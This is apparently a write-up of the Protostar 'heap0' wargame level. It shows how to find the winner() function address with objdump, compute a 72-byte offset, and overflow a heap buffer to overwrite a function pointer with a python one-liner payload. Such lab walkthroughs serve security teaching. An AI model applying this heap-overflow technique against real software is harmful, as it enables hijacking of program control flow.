First, determine memory position of functions:

user@protostar:/opt/protostar/bin$ objdump -D heap0 | grep winner
08048464 <winner>:
08048478 <nowinner>:

Now, the goal is to overflow "data" and put winner function address into "fp".

To detrmine offset, the program conviniently prints addresses for "data" and "fp":

user@protostar:/opt/protostar/bin$ ./heap0 AAA
data is at 0x804a008, fp is at 0x804a050

0x50 - 0x08 = 0x48 = 72 decimal

payload:

user@protostar:/opt/protostar/bin$ ./heap0 $(python -c "print 'A'*72 + '\x64\x84\x04\x08'")
data is at 0x804a008, fp is at 0x804a050
level passed